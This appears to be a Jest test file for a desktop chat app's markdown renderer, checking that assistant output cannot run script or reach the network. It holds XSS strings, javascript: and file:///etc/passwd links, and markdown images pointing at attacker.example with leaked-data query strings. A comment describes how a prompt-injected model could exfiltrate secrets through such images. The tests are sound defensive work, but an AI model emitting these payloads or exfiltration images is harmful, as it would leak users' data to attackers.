import { renderMarkdown, parseMessageSegments, isSafeExternalHref, handleAssistantLinkClick } from './utils';

describe('renderMarkdown', () => {
  it('renders basic markdown', () => {
    expect(renderMarkdown('**bold**')).toContain('<strong>bold</strong>');
  });

  it('escapes raw HTML instead of passing it through', () => {
    // Assistant output is untrusted and gets injected with
    // dangerouslySetInnerHTML, so a script tag must never survive.
    const html = renderMarkdown('<script>alert(1)</script>');
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('escapes HTML inside fenced code', () => {
    const html = renderMarkdown('```js\n<img src=x onerror=alert(1)>\n```');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
  });

  it('rejects a crafted language string rather than emitting it', () => {
    const html = renderMarkdown('```js" onload="alert(1)\ncode\n```');
    expect(html).toContain('class="language-text"');
    expect(html).not.toContain('onload=');
  });

  it('handles empty input', () => {
    expect(renderMarkdown('')).toBe('');
    expect(renderMarkdown(undefined)).toBe('');
  });
});

/**
 * Zero-click exfiltration. A markdown image is native markdown syntax, so
 * `html: false` never applies to it — `![](https://attacker/p.png?d=secret)`
 * would render a live <img src> and the browser fetches it the instant the
 * reply paints, with no user interaction at all. A prompt-injected model
 * (poisoned by a response body, a doc, a pasted API spec) is enough.
 */
describe('renderMarkdown — images never reach the network', () => {
  const IMAGE_CASES = [
    ['remote http image', '![](http://attacker.example/p.png?d=leaked)'],
    ['remote https image', '![alt](https://attacker.example/p.png?d=leaked)'],
    ['image with a title', '![alt](https://attacker.example/p.png "t")'],
    ['protocol-relative image', '![](//attacker.example/p.png)'],
    ['data uri image', '![](data:image/png;base64,iVBORw0KGgo=)'],
    ['reference-style image', '![alt][ref]\n\n[ref]: https://attacker.example/p.png?d=leaked'],
    ['image wrapped in a link', '[![](https://attacker.example/p.png?d=leaked)](https://example.com)'],
    ['image inside a table cell', '| a |\n| --- |\n| ![](https://attacker.example/p.png) |'],
    ['image inside a blockquote', '> ![](https://attacker.example/p.png?d=leaked)'],
    ['image inside a list item', '- ![](https://attacker.example/p.png?d=leaked)']
  ];

  // The only invariant that matters: nothing the browser will fetch.
  it.each(IMAGE_CASES)('emits no <img> for a %s', (_label, markdown) => {
    const html = renderMarkdown(markdown);
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/\ssrc=/i);
  });

  // http/https image syntax reaches the renderer rule and is replaced with an
  // inert marker; schemes rejected by validateLink never become image tokens
  // at all and fall through as literal text.
  it.each([
    ['remote http image', '![](http://attacker.example/p.png?d=leaked)'],
    ['remote https image', '![alt](https://attacker.example/p.png?d=leaked)'],
    ['reference-style image', '![alt][ref]\n\n[ref]: https://attacker.example/p.png?d=leaked'],
    ['image inside a blockquote', '> ![](https://attacker.example/p.png?d=leaked)']
  ])('tells the reader an image was blocked for a %s', (_label, markdown) => {
    expect(renderMarkdown(markdown)).toContain('image blocked');
  });

  it('leaks no exfiltration URL into a fetchable attribute', () => {
    const html = renderMarkdown('![](https://attacker.example/pixel.png?d=SUPERSECRET)');
    // The URL may be shown to the user as text, but never as an attribute a
    // browser would resolve.
    expect(html).not.toMatch(/(src|href|srcset|poster|background)\s*=/i);
  });

  it('keeps the alt text so the reader knows something was blocked', () => {
    expect(renderMarkdown('![diagram of the flow](https://x.example/a.png)')).toContain('diagram of the flow');
  });
});

describe('isSafeExternalHref', () => {
  it.each(['https://example.com', 'http://example.com/a?b=c', 'mailto:a@b.example'])('allows %s', (href) => {
    expect(isSafeExternalHref(href)).toBe(true);
  });

  it.each([
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'java\nscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'blob:https://example.com/abc',
    '/relative/path',
    './relative',
    '',
    '   ',
    null,
    undefined
  ])('rejects %p', (href) => {
    expect(isSafeExternalHref(href)).toBe(false);
  });
});

describe('renderMarkdown — links', () => {
  it('renders an http link as an anchor with no target', () => {
    const html = renderMarkdown('[x](https://example.com/a)');
    expect(html).toContain('href="https://example.com/a"');
    expect(html).not.toMatch(/target=/i);
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it('drops a model-supplied target attribute', () => {
    // markdown-it cannot emit target= on its own, but the rule must strip one
    // if any future plugin or option adds it.
    expect(renderMarkdown('https://example.com')).not.toMatch(/target=/i);
  });

  it.each([
    ['javascript', '[click](javascript:alert(1))', 'javascript:'],
    ['data html', '[click](data:text/html,<script>alert(1)</script>)', 'data:'],
    ['file', '[click](file:///etc/passwd)', 'file:'],
    ['vbscript', '[click](vbscript:msgbox(1))', 'vbscript:'],
    // markdown-it's DEFAULT validateLink allows every one of these. Only the
    // http/https/mailto allowlist keeps them from becoming live anchors that
    // hand a URL to an OS protocol handler.
    ['ftp', '[click](ftp://attacker.example/a)', 'ftp:'],
    ['blob', '[click](blob:https://example.test/abc)', 'blob:'],
    ['about', '[click](about:blank)', 'about:'],
    ['os protocol handler', '[click](ms-msdt:/id%20PCWDiagnostic)', 'ms-msdt:'],
    ['app deep link', '[click](intent://attacker.example/x)', 'intent:']
  ])('never produces an anchor for a %s url', (_label, markdown, scheme) => {
    const html = renderMarkdown(markdown);
    expect(html).not.toContain(`href="${scheme}`);
    // and never an empty href, which would reload the app window
    expect(html).not.toContain('href=""');
  });

  it('still linkifies a bare url', () => {
    expect(renderMarkdown('see https://example.com now')).toContain('<a href="https://example.com"');
  });
});

describe('handleAssistantLinkClick', () => {
  const makeEvent = (html) => {
    const host = document.createElement('div');
    host.innerHTML = html;
    document.body.appendChild(host);
    const anchor = host.querySelector('a');
    return {
      host,
      anchor,
      event: {
        target: anchor,
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      }
    };
  };

  let openExternal;
  beforeEach(() => {
    openExternal = jest.fn();
    window.ipcRenderer = { openExternal };
  });

  afterEach(() => {
    delete window.ipcRenderer;
    document.body.innerHTML = '';
  });

  it('cancels the default action so the app window never navigates', () => {
    const { event } = makeEvent('<a href="https://example.com/a">x</a>');
    handleAssistantLinkClick(event);
    expect(event.preventDefault).toHaveBeenCalled();
    expect(event.stopPropagation).toHaveBeenCalled();
  });

  it('hands a safe url to the OS browser instead', () => {
    const { event } = makeEvent('<a href="https://example.com/a">x</a>');
    expect(handleAssistantLinkClick(event)).toBe(true);
    expect(openExternal).toHaveBeenCalledWith('https://example.com/a');
  });

  it('works when the click lands on a child of the anchor', () => {
    const { host, event } = makeEvent('<a href="https://example.com/a"><code>x</code></a>');
    event.target = host.querySelector('code');
    expect(handleAssistantLinkClick(event)).toBe(true);
    expect(openExternal).toHaveBeenCalledWith('https://example.com/a');
  });

  it('cancels but refuses to open an unsafe scheme', () => {
    const { event } = makeEvent('<a href="javascript:alert(1)">x</a>');
    expect(handleAssistantLinkClick(event)).toBe(false);
    expect(event.preventDefault).toHaveBeenCalled();
    expect(openExternal).not.toHaveBeenCalled();
  });

  it('cancels but refuses a relative href', () => {
    const { event } = makeEvent('<a href="/somewhere">x</a>');
    expect(handleAssistantLinkClick(event)).toBe(false);
    expect(event.preventDefault).toHaveBeenCalled();
    expect(openExternal).not.toHaveBeenCalled();
  });

  it('does nothing when the click was not on a link', () => {
    const host = document.createElement('div');
    host.innerHTML = '<p>plain</p>';
    document.body.appendChild(host);
    const event = { target: host.querySelector('p'), preventDefault: jest.fn(), stopPropagation: jest.fn() };
    expect(handleAssistantLinkClick(event)).toBe(false);
    expect(event.preventDefault).not.toHaveBeenCalled();
  });

  it('still cancels when there is no ipc bridge at all', () => {
    delete window.ipcRenderer;
    const { event } = makeEvent('<a href="https://example.com/a">x</a>');
    expect(handleAssistantLinkClick(event)).toBe(false);
    expect(event.preventDefault).toHaveBeenCalled();
  });
});

describe('parseMessageSegments', () => {
  it('returns nothing for empty content', () => {
    expect(parseMessageSegments('')).toEqual([]);
    expect(parseMessageSegments()).toEqual([]);
  });

  it('returns a single text segment when there is no fence', () => {
    const segments = parseMessageSegments('hello there');
    expect(segments).toHaveLength(1);
    expect(segments[0]).toMatchObject({ type: 'text', content: 'hello there', isOpen: false });
  });

  it('splits text and a closed code fence', () => {
    const segments = parseMessageSegments('before\n```js\nconst a = 1;\n```\nafter');
    expect(segments.map((s) => s.type)).toEqual(['text', 'code', 'text']);
    expect(segments[1]).toMatchObject({ language: 'js', isOpen: false, content: 'const a = 1;\n' });
  });

  it('marks an unterminated fence as still open', () => {
    const segments = parseMessageSegments('intro\n```js\nconst a =');
    expect(segments[segments.length - 1]).toMatchObject({ type: 'code', isOpen: true, language: 'js' });
  });

  it('handles a fence with no language', () => {
    const segments = parseMessageSegments('```\nplain\n```');
    expect(segments).toEqual([{ type: 'code', content: 'plain\n', language: '', isOpen: false }]);
  });

  it('handles multiple fences', () => {
    const segments = parseMessageSegments('a\n```js\n1\n```\nb\n```sh\n2\n```\nc');
    expect(segments.map((s) => s.type)).toEqual(['text', 'code', 'text', 'code', 'text']);
    expect(segments[1].language).toBe('js');
    expect(segments[3].language).toBe('sh');
  });

  it('drops whitespace-only segments', () => {
    const segments = parseMessageSegments('```js\ncode\n```\n\n   \n');
    expect(segments).toHaveLength(1);
    expect(segments[0].type).toBe('code');
  });
});
